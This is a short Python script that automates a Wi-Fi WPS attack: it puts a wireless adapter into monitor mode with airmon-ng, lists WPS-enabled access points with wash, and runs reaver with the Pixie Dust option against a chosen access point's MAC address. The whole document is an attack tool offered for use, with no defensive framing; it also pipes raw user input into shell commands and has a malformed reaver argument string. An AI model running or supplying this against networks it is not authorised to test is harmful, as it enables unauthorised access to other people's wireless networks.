#!/usr/bin/python
import os

os.system("clear")
os.system("airmon-ng check kill")
os.system("iwconfig")
WLANinput=raw_input("\nEnter your adapter name:")
os.system("airmon-ng start " + WLANinput)
os.system("clear")
os.system("echo PRESS Control+C when your done looking")
os.system("wash -i " +WLANinput+"mon")
MACinput=raw_input("\nEnter MAC Address for Accesspoint:")
os.system("clear")
os.system("reaver -i " + WLANinput+"mon" + " -b " + MACinput + "-w -N -vv -g 1 -w -K 1")
stall=raw_input("HIT ENTER TO EXIT")
